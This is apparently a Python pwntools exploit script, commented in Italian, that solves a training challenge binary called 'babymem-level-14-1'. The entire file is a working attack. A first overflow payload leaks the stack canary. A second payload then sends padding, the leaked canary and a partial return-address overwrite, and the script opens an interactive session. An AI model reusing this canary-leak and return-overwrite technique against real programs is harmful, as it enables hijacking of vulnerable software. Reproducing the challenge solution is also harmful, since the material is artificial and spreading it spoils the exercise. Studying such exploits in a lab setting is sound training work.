from pwn import *

context.binary = elf = ELF("/challenge/babymem-level-14-1")
p = elf.process()

# === PAYLOAD 1: Overflow + scrivi i due byte sul return address + "REPEAT" ===
payload1 = b"REPEAT" + b"A" * 208  # Riempie fino al punto dove inizia il canary
payload1 += b"XYZ"     # Aggiungi un marker per ricevere la risposta (XYZ)

# Invia la lunghezza del payload (richiesta dal programma)
p.sendline(f'{len(payload1)}'.encode())
p.sendline(payload1)

# Dopo l'invio, ricevi i dati finché non vedi il marker "XYZ" che ci permette di capire dove siamo
p.recvuntil(b'XYZ')  

# Ora leggi 7 byte dallo stack che dovrebbero essere il canary
cana = u64(p.recv(7).rjust(8, b'\x00'))  # Legge 7 byte e li converte in un valore a 64 bit
cana = p64(cana)  # Converte il canary in formato p64 (8 byte)

# Ora puoi fare quello che vuoi con il canary
print(f"Canary: {cana}")

payload2 = b'A' * 488 + cana + b"CIAOCIAO" + b"\x04\xc0"

p.sendline(f'{len(payload2)}'.encode())
p.sendline(payload2)

# Interattiva per interagire con il processo
p.interactive()
